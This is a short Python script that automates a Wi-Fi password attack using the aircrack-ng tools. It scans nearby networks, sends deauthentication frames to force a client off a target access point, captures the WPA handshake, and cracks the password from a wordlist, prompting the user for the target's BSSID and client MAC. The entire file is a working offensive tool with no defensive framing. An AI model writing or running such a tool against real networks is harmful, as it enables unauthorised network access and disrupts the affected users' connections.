#!/usr/bin/env python3
import subprocess
import re

def scan_networks():
    output = subprocess.check_output(['iwlist', 'wlan0', 'scan'])
    networks = re.findall(r'Cell \d+ - Address: ([\w:]+).*ESSID:"(.*)"', output.decode('utf-8'), re.DOTALL)
    return networks

def deauth_client(bssid, client_mac):
    subprocess.run(['aireplay-ng', '--deauth', '1', '-a', bssid, '-c', client_mac, 'wlan0mon'])

def capture_handshake(bssid, channel):
    subprocess.run(['airodump-ng', '-c', channel, '--bssid', bssid, '-w', 'capture', 'wlan0mon'])

def crack_password(bssid, wordlist):
    output = subprocess.check_output(['aircrack-ng', '-w', wordlist, '-b', bssid, 'capture-01.cap'])
    match = re.search(r'KEY FOUND! \[ (.*) \]', output.decode('utf-8'))
    if match:
        return match.group(1)
    else:
        return None

# Example usage
networks = scan_networks()
for bssid, essid in networks:
    print(f'BSSID: {bssid}, ESSID: {essid}')

bssid = input('Enter target BSSID: ')
channel = input('Enter target channel: ')
client_mac = input('Enter client MAC: ')

deauth_client(bssid, client_mac)
capture_handshake(bssid, channel)

password = crack_password(bssid, '/path/to/wordlist.txt')
if password:
    print(f'Password cracked: {password}')
else:
    print('Failed to crack password')